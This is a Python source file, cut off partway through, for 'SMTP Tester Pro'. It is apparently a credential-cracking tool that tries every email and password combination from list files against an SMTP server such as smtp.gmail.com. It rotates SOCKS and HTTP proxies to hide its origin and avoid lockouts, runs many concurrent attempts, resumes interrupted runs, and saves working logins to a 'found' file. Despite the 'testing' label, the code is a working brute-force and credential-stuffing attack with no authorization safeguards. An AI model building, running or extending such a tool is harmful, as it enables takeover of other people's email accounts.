#!/usr/bin/env python3
"""
SMTP Tester Pro - Advanced SMTP Credential Testing Tool
=========================================================
A standalone, asynchronous SMTP testing tool with proxy support,
beautiful UI, and comprehensive features.

Author: SMTP Tester Pro
Version: 2.0.0
"""

import asyncio
import argparse
import json
import csv
import os
import sys
import re
import time
import random
import socket
import ssl
import logging
from pathlib import Path
from datetime import datetime
from typing import Optional, List, Dict, Tuple, Any, Set
from dataclasses import dataclass, field, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import smtplib
import threading
from queue import Queue

# Third-party imports with graceful fallback
RICH_AVAILABLE = False
SOCKS_AVAILABLE = False
AIOHTTP_AVAILABLE = False
YAML_AVAILABLE = False

# Try importing rich for beautiful UI
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, MofNCompleteColumn
    from rich.live import Live
    from rich.layout import Layout
    from rich.text import Text
    from rich.style import Style
    from rich.logging import RichHandler
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    RICH_AVAILABLE = True
except ImportError:
    pass

# Try importing socks for proxy support
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    pass

# Try importing aiohttp for async HTTP
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    pass

# Try importing yaml for config files
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    pass


# Initialize console or fallback
if RICH_AVAILABLE:
    console = Console()
else:
    # Fallback simple console
    class SimpleConsole:
        def print(self, msg, **kwargs):
            # Strip rich markup for plain text
            import re
            clean = re.sub(r'\[/?[\w\s\d\-,;:=]+\]', '', str(msg))
            print(clean)
        
        def rule(self, title="", **kwargs):
            print(f"\n{'='*50}\n{title}\n{'='*50}\n")
    
    console = SimpleConsole()
    
    # Fallback classes for when rich is not available
    class Panel:
        def __init__(self, content, **kwargs):
            self.content = content
    
    class Table:
        def __init__(self, **kwargs):
            self.rows = []
        
        def add_column(self, *args, **kwargs):
            pass
        
        def add_row(self, *args, **kwargs):
            self.rows.append(args)
    
    class Progress:
        def __init__(self, *args, **kwargs):
            pass
        
        def __enter__(self):
            return self
        
        def __exit__(self, *args):
            pass
        
        def add_task(self, *args, **kwargs):
            return 0
        
        def update(self, *args, **kwargs):
            pass
    
    class Prompt:
        @staticmethod
        def ask(prompt, **kwargs):
            return input(prompt + ": ")
    
    class Confirm:
        @staticmethod
        def ask(prompt, **kwargs):
            return input(prompt + " (y/n): ").lower().startswith('y')


def check_dependencies():
    """Check and report missing dependencies"""
    missing = []
    
    if not RICH_AVAILABLE:
        missing.append("rich (pip install rich) - Required for beautiful terminal UI")
    
    if not SOCKS_AVAILABLE:
        missing.append("PySocks (pip install pysocks) - Required for proxy support")
    
    if missing:
        console.print("[yellow]Missing optional dependencies:[/yellow]" if RICH_AVAILABLE else "Missing optional dependencies:")
        for dep in missing:
            console.print(f"  - {dep}")
        console.print("" if RICH_AVAILABLE else "")
        console.print("[cyan]Install all dependencies with: pip install -r requirements.txt[/cyan]" if RICH_AVAILABLE else "Install all dependencies with: pip install -r requirements.txt")
        console.print("")


def check_proxy_available():
    """Check if proxy support is available"""
    if not SOCKS_AVAILABLE:
        console.print("[red]Error: PySocks not installed. Proxy support is not available.[/red]" if RICH_AVAILABLE else "Error: PySocks not installed. Proxy support is not available.")
        console.print("[yellow]Install with: pip install pysocks[/yellow]" if RICH_AVAILABLE else "Install with: pip install pysocks")
        return False
    return True


# ============== ENUMS ==============

class ProxyType(Enum):
    NONE = "none"
    HTTP = "http"
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"
    ROTATING = "rotating"


class OutputFormat(Enum):
    TXT = "txt"
    JSON = "json"
    CSV = "csv"
    ALL = "all"


class LogLevel(Enum):
    DEBUG = "debug"
    INFO = "info"
    WARNING = "warning"
    ERROR = "error"


class SMTPSecurity(Enum):
    NONE = "none"
    SSL = "ssl"
    TLS = "tls"
    STARTTLS = "starttls"


# ============== DATACLASSES ==============

@dataclass
class ProxyConfig:
    """Proxy configuration"""
    proxy_type: ProxyType = ProxyType.NONE
    proxy_list: List[str] = field(default_factory=list)
    current_index: int = 0
    proxy_file: Optional[str] = None
    auth: Optional[Tuple[str, str]] = None

    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy from the list (for rotating)"""
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxy_list)
        return proxy

    def parse_proxy(self, proxy_str: str) -> Dict[str, Any]:
        """Parse proxy string into components"""
        proxy_str = proxy_str.strip()
        if not proxy_str:
            return {}

        # Format: [protocol://]host:port[:username:password]
        parts = proxy_str.split("://")
        protocol = "http"
        if len(parts) > 1:
            protocol = parts[0].lower()
            proxy_str = parts[1]

        # Parse host:port and optional auth
        components = proxy_str.split(":")
        result = {"protocol": protocol}

        if len(components) >= 2:
            result["host"] = components[0]
            result["port"] = int(components[1]) if components[1].isdigit() else 80

        if len(components) >= 4:
            result["username"] = components[2]
            result["password"] = components[3]

        return result


@dataclass
class SMTPConfig:
    """SMTP server configuration"""
    host: str
    port: int = 587
    security: SMTPSecurity = SMTPSecurity.STARTTLS
    timeout: int = 30
    ehlo_domain: str = "localhost"
    verify_ssl: bool = True


@dataclass
class TestResult:
    """Result of a single test attempt"""
    email: str
    password: str
    success: bool
    error_message: Optional[str] = None
    proxy_used: Optional[str] = None
    response_time: float = 0.0
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class Statistics:
    """Test statistics"""
    total_tests: int = 0
    completed_tests: int = 0
    successful_tests: int = 0
    failed_tests: int = 0
    skipped_tests: int = 0
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    errors: Dict[str, int] = field(default_factory=dict)
    proxy_errors: int = 0
    timeout_errors: int = 0

    @property
    def elapsed_time(self) -> float:
        if self.start_time is None:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    @property
    def success_rate(self) -> float:
        if self.completed_tests == 0:
            return 0.0
        return (self.successful_tests / self.completed_tests) * 100

    @property
    def tests_per_second(self) -> float:
        if self.elapsed_time == 0:
            return 0.0
        return self.completed_tests / self.elapsed_time


@dataclass
class AppConfig:
    """Application configuration"""
    # File paths
    email_file: str = "emails.txt"
    password_file: str = "passwords.txt"
    output_dir: str = "results"
    tried_file: str = "tried.txt"
    found_file: str = "found.txt"

    # SMTP settings
    smtp_host: str = ""
    smtp_port: int = 587
    smtp_security: SMTPSecurity = SMTPSecurity.STARTTLS
    smtp_timeout: int = 30

    # Proxy settings
    proxy_config: ProxyConfig = field(default_factory=ProxyConfig)

    # Performance settings
    max_workers: int = 10
    max_async_tasks: int = 50
    rate_limit: int = 0  # 0 = no limit
    retry_count: int = 3
    retry_delay: float = 1.0

    # Output settings
    output_format: OutputFormat = OutputFormat.TXT
    verbose: bool = False
    log_level: LogLevel = LogLevel.INFO
    save_tried: bool = True
    resume: bool = True

    def to_dict(self) -> Dict:
        result = {
            "email_file": self.email_file,
            "password_file": self.password_file,
            "output_dir": self.output_dir,
            "smtp_host": self.smtp_host,
            "smtp_port": self.smtp_port,
            "smtp_security": self.smtp_security.value,
            "smtp_timeout": self.smtp_timeout,
            "proxy_type": self.proxy_config.proxy_type.value,
            "max_workers": self.max_workers,
            "max_async_tasks": self.max_async_tasks,
            "rate_limit": self.rate_limit,
            "retry_count": self.retry_count,
            "retry_delay": self.retry_delay,
            "output_format": self.output_format.value,
            "verbose": self.verbose,
            "log_level": self.log_level.value,
            "save_tried": self.save_tried,
            "resume": self.resume
        }
        if self.proxy_config.proxy_file:
            result["proxy_file"] = self.proxy_config.proxy_file
        return result

    @classmethod
    def from_dict(cls, data: Dict) -> 'AppConfig':
        config = cls()
        for key, value in data.items():
            if hasattr(config, key):
                if key == "proxy_type":
                    config.proxy_config.proxy_type = ProxyType(value)
                elif key == "smtp_security":
                    config.smtp_security = SMTPSecurity(value)
                elif key == "output_format":
                    config.output_format = OutputFormat(value)
                elif key == "log_level":
                    config.log_level = LogLevel(value)
                elif key == "proxy_file":
                    config.proxy_config.proxy_file = value
                else:
                    setattr(config, key, value)
        return config


# ============== LOGGER ==============

class SMTPLogger:
    """Custom logger with rich output"""

    def __init__(self, log_level: LogLevel = LogLevel.INFO, log_file: Optional[str] = None):
        self.log_level = log_level
        self.log_file = log_file
        self.logger = logging.getLogger("SMTPTester")
        self.logger.setLevel(getattr(logging, log_level.value.upper()))

        # Clear existing handlers
        self.logger.handlers = []

        # Rich handler for console
        rich_handler = RichHandler(
            console=console,
            show_time=True,
            show_path=False,
            markup=True
        )
        self.logger.addHandler(rich_handler)

        # File handler
        if log_file:
            file_handler = logging.FileHandler(log_file)
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            self.logger.addHandler(file_handler)

    def debug(self, msg: str):
        self.logger.debug(msg)

    def info(self, msg: str):
        self.logger.info(msg)

    def warning(self, msg: str):
        self.logger.warning(msg)

    def error(self, msg: str):
        self.logger.error(msg)


# ============== EMAIL VALIDATOR ==============

class EmailValidator:
    """Email validation utilities"""

    EMAIL_REGEX = re.compile(
        r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    )

    COMMON_DOMAINS = {
        'gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com',
        'aol.com', 'icloud.com', 'mail.com', 'protonmail.com',
        'zoho.com', 'yandex.com', 'qq.com', '163.com', '126.com'
    }

    @classmethod
    def is_valid_format(cls, email: str) -> bool:
        """Check if email has valid format"""
        return bool(cls.EMAIL_REGEX.match(email))

    @classmethod
    def get_domain(cls, email: str) -> Optional[str]:
        """Extract domain from email"""
        if '@' in email:
            return email.split('@')[1].lower()
        return None

    @classmethod
    def is_common_domain(cls, domain: str) -> bool:
        """Check if domain is common email provider"""
        return domain.lower() in cls.COMMON_DOMAINS

    @classmethod
    def validate_email_list(cls, emails: List[str]) -> Tuple[List[str], List[str]]:
        """Validate list of emails, return (valid, invalid)"""
        valid, invalid = [], []
        for email in emails:
            email = email.strip()
            if cls.is_valid_format(email):
                valid.append(email)
            else:
                invalid.append(email)
        return valid, invalid


# ============== PROXY MANAGER ==============

class ProxyManager:
    """Manage proxy connections"""

    def __init__(self, config: ProxyConfig):
        self.config = config
        self.current_proxy: Optional[str] = None
        self.proxy_stats: Dict[str, Dict] = {}
        self._lock = threading.Lock()

    def load_proxies(self, proxy_file: str) -> int:
        """Load proxies from file"""
        try:
            with open(proxy_file, 'r') as f:
                self.config.proxy_list = [
                    line.strip() for line in f
                    if line.strip() and not line.startswith('#')
                ]
            return len(self.config.proxy_list)
        except FileNotFoundError:
            console.print(f"[red]Proxy file not found: {proxy_file}[/red]")
            return 0

    def get_socket_with_proxy(self, proxy_str: Optional[str] = None) -> socket.socket:
        """Create socket with proxy configuration"""
        if self.config.proxy_type == ProxyType.NONE:
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        proxy = proxy_str or self.config.get_next_proxy()
        if not proxy:
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        proxy_info = self.config.parse_proxy(proxy)
        host = proxy_info.get("host", "")
        port = proxy_info.get("port", 1080)
        username = proxy_info.get("username")
        password = proxy_info.get("password")

        sock_type = socks.SOCKS5
        if self.config.proxy_type == ProxyType.SOCKS4:
            sock_type = socks.SOCKS4
        elif self.config.proxy_type == ProxyType.HTTP:
            # For HTTP proxy, we need to handle differently
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            return sock

        # Create SOCKS socket
        if username and password:
            sock = socks.socksocket()
            sock.set_proxy(
                sock_type,
                host,
                port,
                username=username,
                password=password
            )
        else:
            sock = socks.socksocket()
            sock.set_proxy(sock_type, host, port)

        return sock

    def record_proxy_result(self, proxy: str, success: bool, error: Optional[str] = None):
        """Record proxy performance"""
        with self._lock:
            if proxy not in self.proxy_stats:
                self.proxy_stats[proxy] = {
                    "attempts": 0,
                    "successes": 0,
                    "failures": 0,
                    "errors": []
                }

            self.proxy_stats[proxy]["attempts"] += 1
            if success:
                self.proxy_stats[proxy]["successes"] += 1
            else:
                self.proxy_stats[proxy]["failures"] += 1
                if error:
                    self.proxy_stats[proxy]["errors"].append(error)

    def get_best_proxy(self) -> Optional[str]:
        """Get proxy with best performance"""
        if not self.proxy_stats:
            return self.config.get_next_proxy()

        best_proxy = None
        best_rate = -1

        for proxy, stats in self.proxy_stats.items():
            if stats["attempts"] > 0:
                rate = stats["successes"] / stats["attempts"]
                if rate > best_rate:
                    best_rate = rate
                    best_proxy = proxy

        return best_proxy or self.config.get_next_proxy()


# ============== SMTP TESTER ==============

class SMTPTester:
    """Core SMTP testing engine"""

    def __init__(self, config: AppConfig, logger: SMTPLogger):
        self.config = config
        self.logger = logger
        self.stats = Statistics()
        self.proxy_manager = ProxyManager(config.proxy_config)
        self.results: List[TestResult] = []
        self.tried_credentials: Set[str] = set()
        self._lock = threading.Lock()
        self._stop_event = threading.Event()

    def load_credentials(self) -> Tuple[List[str], List[str]]:
        """Load emails and passwords from files"""
        emails = []
        passwords = []

        try:
            with open(self.config.email_file, 'r', encoding='utf-8' , errors='ignore') as f:
                emails = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.logger.error(f"Email file not found: {self.config.email_file}")
            raise

        try:
            with open(self.config.password_file, 'r', encoding='utf-8' , errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.logger.error(f"Password file not found: {self.config.password_file}")
            raise

        # Load tried credentials for resume
        if self.config.resume and os.path.exists(self.config.tried_file):
            with open(self.config.tried_file, 'r') as f:
                for line in f:
                    parts = line.strip().split(' -- ')
                    if len(parts) == 2:
                        self.tried_credentials.add(f"{parts[0]}:{parts[1]}")
            self.logger.info(f"Loaded {len(self.tried_credentials)} previously tried credentials")

        return emails, passwords

    def test_smtp_connection(self, email: str, password: str, proxy: Optional[str] = None) -> TestResult:
        """Test a single SMTP credential"""
        start_time = time.time()
        credential_key = f"{email}:{password}"

        # Skip if already tried
        if credential_key in self.tried_credentials:
            return TestResult(
                email=email,
                password=password,
                success=False,
                error_message="Already tried",
                proxy_used=proxy
            )

        for attempt in range(self.config.retry_count):
            try:
                # Create SMTP connection
                if self.config.proxy_config.proxy_type != ProxyType.NONE and proxy:
                    sock = self.proxy_manager.get_socket_with_proxy(proxy)
                    sock.settimeout(self.config.smtp_timeout)

                    smtp = smtplib.SMTP(
                        self.config.smtp_host,
                        self.config.smtp_port,
                        timeout=self.config.smtp_timeout
                    )

                    # Replace socket
                    smtp.sock = sock
                    smtp.file = smtp.sock.makefile('rb')
                else:
                    smtp = smtplib.SMTP(
                        self.config.smtp_host,
                        self.config.smtp_port,
                        timeout=self.config.smtp_timeout
                    )

                # SMTP handshake
                smtp.ehlo("localhost")

                # Apply security
                if self.config.smtp_security == SMTPSecurity.STARTTLS:
                    smtp.starttls()
                    smtp.ehlo()
                elif self.config.smtp_security == SMTPSecurity.SSL:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE

                # Attempt login
                smtp.login(email, password)
                smtp.quit()

                response_time = time.time() - start_time

                return TestResult(
                    email=email,
                    password=password,
                    success=True,
                    proxy_used=proxy,
                    response_time=response_time
                )

            except smtplib.SMTPAuthenticationError as e:
                response_time = time.time() - start_time
                return TestResult(
                    email=email,
                    password=password,
                    success=False,
                    error_message=f"Authentication failed: {str(e)}",
                    proxy_used=proxy,
                    response_time=response_time
                )

            except smtplib.SMTPServerDisconnected as e:
                self.logger.debug(f"Server disconnected for {email}: {e}")
                if attempt < self.config.retry_count - 1:
                    time.sleep(self.config.retry_delay)
                continue

            except smtplib.SMTPConnectError as e:
                self.logger.debug(f"Connection error for {email}: {e}")
                if proxy:
                    self.proxy_manager.record_proxy_result(proxy, False, str(e))
                if attempt < self.config.retry_count - 1:
                    time.sleep(self.config.retry_delay)
                continue

            except socket.timeout:
                self.logger.debug(f"Timeout for {email}")
                if proxy:
                    self.proxy_manager.record_proxy_result(proxy, False, "Timeout")
                self.stats.timeout_errors += 1
                if attempt < self.config.retry_count - 1:
                    time.sleep(self.config.retry_delay)
                continue

            except Exception as e:
                self.logger.debug(f"Unexpected error for {email}: {e}")
                if proxy:
                    self.proxy_manager.record_proxy_result(proxy, False, str(e))
                if attempt < self.config.retry_count - 1:
                    time.sleep(self.config.retry_delay)
                continue

        # All retries exhausted
        response_time = time.time() - start_time
        return TestResult(
            email=email,
            password=password,
            success=False,
            error_message="Max retries exceeded",
            proxy_used=proxy,
            response_time=response_time
        )

    def save_result(self, result: TestResult):
        """Save test result"""
        with self._lock:
            self.results.append(result)
            self.stats.completed_tests += 1

            if result.success:
                self.stats.successful_tests += 1
                self._save_found(result)
            else:
                self.stats.failed_tests += 1
                if result.error_message:
                    self.stats.errors[result.error_message] = self.stats.errors.get(result.error_message, 0) + 1

            if self.config.save_tried:
                self._save_tried(result)

            # Record proxy performance
            if result.proxy_used:
                self.proxy_manager.record_proxy_result(
                    result.proxy_used,
                    result.success,
                    result.error_message
                )

    def _save_found(self, result: TestResult):
        """Save found credential"""
        os.makedirs(os.path.dirname(self.config.found_file) or '.', exist_ok=True)
        with open(self.config.found_file, 'a') as f:
            f.write(f"{result.email}:{result.password}\n")

    def _save_tried(self, result: TestResult):
        """Save tried credential"""
        os.makedirs(os.path.dirname(self.config.tried_file) or '.', exist_ok=True)
        with open(self.config.tried_file, 'a') as f:
            f.write(f"{result.email} -- {result.password}\n")

    def stop(self):
        """Stop testing"""
        self._stop_event.set()

    def is_stopped(self) -> bool:
        """Check if testing should stop"""
        return self._stop_event.is_set()


# ============== ASYNC SMTP TESTER ==============

class AsyncSMTPTester(SMTPTester):
    """Asynchronous SMTP testing engine"""

    def __init__(self, config: AppConfig, logger: SMTPLogger):
        super().__init__(config, logger)
        self._async_lock = asyncio.Lock()

    async def test_smtp_connection_async(
        self,
        email: str,
        password: str,
        proxy: Optional[str] = None
    ) -> TestResult:
        """Async test for single SMTP credential"""
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None,
            self.test_smtp_connection,
            email,
            password,
            proxy
        )

    async def run_async(
        self,
        emails: List[str],
        passwords: List[str],
        progress_callback: Optional[callable] = None
    ):
        """Run async tests"""
        self.stats.total_tests = len(emails) * len(passwords)
        self.stats.start_time = time.time()

        semaphore = asyncio.Semaphore(self.config.max_async_tasks)

        async def limited_test(email: str, password: str):
            async with semaphore:
                if self.is_stopped():
                    return None

                proxy = None
                if self.config.proxy_config.proxy_type != ProxyType.NONE:
                    proxy = self.config.proxy_config.get_next_proxy()

                result = await self.test_smtp_connection_async(email, password, proxy)
                self.save_result(result)

                if progress_callback:
                    progress_callback(result)

                # Rate limiting
                if self.config.rate_limit > 0:
                    await asyncio.sleep(1.0 / self.config.rate_limit)

                return result

        tasks = []
        for email in emails:
            for password in passwords:
                if self.is_stopped():
                    break
                tasks.append(limited_test(email, password))

        await asyncio.gather(*tasks, return_exceptions=True)

        self.stats.end_time = time.time()


# ============== UI MANAGER ==============

class UIManager:
    """Manage terminal UI"""

    def __init__(self, config: AppConfig):
        self.config = config
        self.layout = Layout()

    def show_banner(self):
        """Display application banner"""
        banner_text = """
[bold cyan]╔══════════════════════════════════════════════════════════════╗[/bold cyan]
[bold cyan]║[/bold cyan]  [bold white]SMTP Tester Pro v2.0[/bold white] - Advanced SMTP Testing Tool  [bold cyan]║[/bold cyan]
[bold cyan]║[/bold cyan]                                                              [bold cyan]║[/bold cyan]
[bold cyan]║[/bold cyan]  [yellow]•[/yellow] Async Support    [yellow]•[/yellow] Proxy Support    [yellow]•[/yellow] Multi-threaded  [bold cyan]║[/bold cyan]
[bold cyan]║[/bold cyan]  [yellow]•[/yellow] SSL/TLS Options   [yellow]•[/yellow] Progress Track   [yellow]•[/yellow] Export Results  [bold cyan]║[/bold cyan]
[bold cyan]╚══════════════════════════════════════════════════════════════╝[/bold cyan]
        """
        console.print(banner_text)

    def show_config_summary(self, config: AppConfig):
        """Display configuration summary"""
        table = Table(title="Configuration", show_header=False, box=None)
        table.add_column("Key", style="cyan")
        table.add_column("Value", style="green")

        table.add_row("SMTP Host", config.smtp_host)
        table.add_row("SMTP Port", str(config.smtp_port))
        table.add_row("Security", config.smtp_security.value.upper())
        table.add_row("Timeout", f"{config.smtp_timeout}s")
        table.add_row("Workers", str(config.max_workers))
        table.add_row("Async Tasks", str(config.max_async_tasks))
        table.add_row("Proxy Type", config.proxy_config.proxy_type.value.upper())
        if config.proxy_config.proxy_file:
            table.add_row("Proxy File", config.proxy_config.proxy_file)
        table.add_row("Output Format", config.output_format.value.upper())
        table.add_row("Resume Mode", "Yes" if config.resume else "No")

        console.print(Panel(table, title="[bold]Settings[/bold]", border_style="blue"))

    def show_statistics(self, stats: Statistics):
        """Display current statistics"""
        table = Table(title="Statistics", show_header=False, box=None)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="yellow")

        table.add_row("Total Tests", f"{stats.total_tests:,}")
        table.add_row("Completed", f"{stats.completed_tests:,}")
        table.add_row("Successful", f"[green]{stats.successful_tests:,}[/green]")
        table.add_row("Failed", f"[red]{stats.failed_tests:,}[/red]")
        table.add_row("Skipped", f"{stats.skipped_tests:,}")
        table.add_row("Success Rate", f"{stats.success_rate:.2f}%")
        table.add_row("Tests/sec", f"{stats.tests_per_second:.2f}")
        table.add_row("Elapsed", f"{stats.elapsed_time:.2f}s")

        console.print(table)

    def show_results_table(self, results: List[TestResult], limit: int = 10):
        """Display results in table format"""
        table = Table(title="Results", show_header=True)
        table.add_column("#", style="dim", width=4)
        table.add_column("Email", style="cyan")
        table.add_column("Password", style="yellow")
        table.add_column("Status", width=8)
        table.add_column("Time", style="dim")
        table.add_column("Proxy", style="dim")

        for i, result in enumerate(results[:limit]):
            status = "[green]SUCCESS[/green]" if result.success else "[red]FAILED[/red]"
            table.add_row(
                str(i + 1),
                result.email,
                result.password,
                status,
                f"{result.response_time:.2f}s",
                result.proxy_used or "N/A"
            )

        console.print(table)

    def show_found_credentials(self, results: List[TestResult]):
        """Display found credentials"""
        successful = [r for r in results if r.success]

        if not successful:
            console.print("[yellow]No successful logins found[/yellow]")
            return

        table = Table(title="[bold green]Found Credentials[/bold green]", show_header=True)
        table.add_column("Email", style="cyan")
        table.add_column("Password", style="green")
        table.add_column("Response Time", style="yellow")

        for result in successful:
            table.add_row(
                result.email,
                result.password,
                f"{result.response_time:.2f}s"
            )

        console.print(table)

    def create_progress(self) -> Progress:
        """Create progress bar"""
        return Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TextColumn("•"),
            TimeElapsedColumn(),
            console=console
        )

    def show_proxy_stats(self, proxy_stats: Dict[str, Dict]):
        """Display proxy statistics"""
        if not proxy_stats:
            return

        table = Table(title="Proxy Statistics", show_header=True)
        table.add_column("Proxy", style="cyan")
        table.add_column("Attempts", style="yellow")
        table.add_column("Success", style="green")
        table.add_column("Failures", style="red")
        table.add_column("Rate", style="blue")

        for proxy, stats in proxy_stats.items():
            rate = (stats["successes"] / stats["attempts"] * 100) if stats["attempts"] > 0 else 0
            table.add_row(
                proxy[:30] + "..." if len(proxy) > 30 else proxy,
                str(stats["attempts"]),
                str(stats["successes"]),
                str(stats["failures"]),
                f"{rate:.1f}%"
            )

        console.print(table)


# ============== EXPORT MANAGER ==============

class ExportManager:
    """Export results to various formats"""

    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def export_txt(self, results: List[TestResult], filename: str = "results.txt"):
        """Export to plain text"""
        filepath = os.path.join(self.output_dir, filename)
        with open(filepath, 'w') as f:
            f.write("SMTP Tester Pro - Results\n")
            f.write("=" * 50 + "\n\n")

            successful = [r for r in results if r.success]
            failed = [r for r in results if not r.success]

            f.write(f"Total Tests: {len(results)}\n")
            f.write(f"Successful: {len(successful)}\n")
            f.write(f"Failed: {len(failed)}\n\n")

            if successful:
                f.write("SUCCESSFUL LOGINS:\n")
                f.write("-" * 30 + "\n")
                for r in successful:
                    f.write(f"{r.email}:{r.password}\n")
                f.write("\n")

            if failed:
                f.write("FAILED ATTEMPTS:\n")
                f.write("-" * 30 + "\n")
                for r in failed:
                    f.write(f"{r.email}:{r.password} - {r.error_message}\n")

        return filepath

    def export_json(self, results: List[TestResult], filename: str = "results.json"):
        """Export to JSON"""
        filepath = os.path.join(self.output_dir, filename)
        data = {
            "generated_at": datetime.now().isoformat(),
            "total_tests": len(results),
            "successful": len([r for r in results if r.success]),
            "failed": len([r for r in results if not r.success]),
            "results": [r.to_dict() for r in results]
        }
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        return filepath

    def export_csv(self, results: List[TestResult], filename: str = "results.csv"):
        """Export to CSV"""
        filepath = os.path.join(self.output_dir, filename)
        with open(filepath, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['email', 'password', 'success', 'error', 'proxy', 'response_time', 'timestamp'])
            for r in results:
                writer.writerow([
                    r.email,
                    r.password,
                    r.success,
                    r.error_message or '',
                    r.proxy_used or '',
                    r.response_time,
                    r.timestamp
                ])
        return filepath

    def export_all(self, results: List[TestResult]) -> Dict[str, str]:
        """Export to all formats"""
        return {
            "txt": self.export_txt(results),
            "json": self.export_json(results),
            "csv": self.export_csv(results)
        }


# ============== CONFIG MANAGER ==============

class ConfigManager:
    """Manage configuration files"""

    @staticmethod
    def save_config(config: AppConfig, filepath: str):
        """Save configuration to file"""
        data = config.to_dict()
        ext = os.path.splitext(filepath)[1].lower()

        if ext in ['.yaml', '.yml'] and YAML_AVAILABLE:
            with open(filepath, 'w') as f:
                yaml.dump(data, f, default_flow_style=False)
        else:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)

    @staticmethod
    def load_config(filepath: str) -> AppConfig:
        """Load configuration from file"""
        if not os.path.exists(filepath):
            return AppConfig()

        ext = os.path.splitext(filepath)[1].lower()

        if ext in ['.yaml', '.yml'] and YAML_AVAILABLE:
            with open(filepath, 'r') as f:
                data = yaml.safe_load(f)
        else:
            with open(filepath, 'r') as f:
                data = json.load(f)

        return AppConfig.from_dict(data)

    @staticmethod
    def create_default_config(filepath: str):
        """Create default configuration file"""
        config = AppConfig()
        ConfigManager.save_config(config, filepath)


# ============== MAIN APPLICATION ==============

class SMTPTesterApp:
    """Main application class"""

    def __init__(self):
        self.config: Optional[AppConfig] = None
        self.logger: Optional[SMTPLogger] = None
        self.tester: Optional[SMTPTester] = None
        self.ui: Optional[UIManager] = None
        self.exporter: Optional[ExportManager] = None

    def parse_arguments(self) -> argparse.Namespace:
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(
            description="SMTP Tester Pro - Advanced SMTP Credential Testing Tool",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  %(prog)s -H smtp.gmail.com -P 587 -e emails.txt -p passwords.txt
  %(prog)s -H smtp.gmail.com -P 587 -e emails.txt -p passwords.txt --proxy socks5://127.0.0.1:1080
  %(prog)s -H smtp.gmail.com -P 587 -e emails.txt -p passwords.txt --proxy-list proxies.txt
  %(prog)s --config config.json
            """
        )

        # SMTP settings
        parser.add_argument('-H', '--host', dest='smtp_host', help='SMTP server host')
        parser.add_argument('-P', '--port', dest='smtp_port', type=int, default=587, help='SMTP server port (default: 587)')
        parser.add_argument('--security', choices=['none', 'ssl', 'tls', 'starttls'], default='starttls', help='Security mode')
        parser.add_argument('--timeout', type=int, default=30, help='Connection timeout in seconds')

        # Input files
        parser.add_argument('-e', '--emails', dest='email_file', help='Path to email list file')
        parser.add_argument('-p', '--passwords', dest='password_file', help='Path to password list file')

        # Proxy settings
        parser.add_argument('--proxy', help='Single proxy (format: protocol://host:port)')
        parser.add_argument('--proxy-list', dest='proxy_file', help='Path to proxy list file')
        parser.add_argument('--proxy-type', choices=['none', 'http', 'socks4', 'socks5', 'rotating'], default='none', help='Proxy type')

        # Performance settings
        parser.add_argument('-w', '--workers', dest='max_workers', type=int, default=10, help='Number of worker threads')
        parser.add_argument('--async-tasks', dest='max_async_tasks', type=int, default=50, help='Number of async tasks')
        parser.add_argument('--rate-limit', dest='rate_limit', type=int, default=0, help='Rate limit (requests per second, 0=unlimited)')
        parser.add_argument('--retry', dest='retry_count', type=int, default=3, help='Retry attempts')
        parser.add_argument('--no-async', dest='use_async', action='store_false', help='Disable async mode')

        # Output settings
        parser.add_argument('-o', '--output', dest='output_dir', default='results', help='Output directory')
        parser.add_argument('-f', '--format', dest='output_format', choices=['txt', 'json', 'csv', 'all'], default='txt', help='Output format')
        parser.add_argument('--no-save-tried', dest='save_tried', action='store_false', help='Don\'t save tried credentials')
        parser.add_argument('--no-resume', dest='resume', action='store_false', help='Don\'t resume from previous session')

        # Logging
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
        parser.add_argument('--log-level', dest='log_level', choices=['debug', 'info', 'warning', 'error'], default='info', help='Log level')
        parser.add_argument('--log-file', dest='log_file', help='Log file path')

        # Configuration
        parser.add_argument('-c', '--config', dest='config_file', help='Path to configuration file')
        parser.add_argument('--create-config', dest='create_config', help='Create default configuration file')

        return parser.parse_args()

    def initialize(self, args: argparse.Namespace):
        """Initialize application components"""
        # Load or create config
        if args.config_file and os.path.exists(args.config_file):
            self.config = ConfigManager.load_config(args.config_file)
        else:
            self.config = AppConfig()

        # Override with command line arguments
        if args.smtp_host:
            self.config.smtp_host = args.smtp_host
        if args.smtp_port:
            self.config.smtp_port = args.smtp_port
        if args.security:
            self.config.smtp_security = SMTPSecurity(args.security)
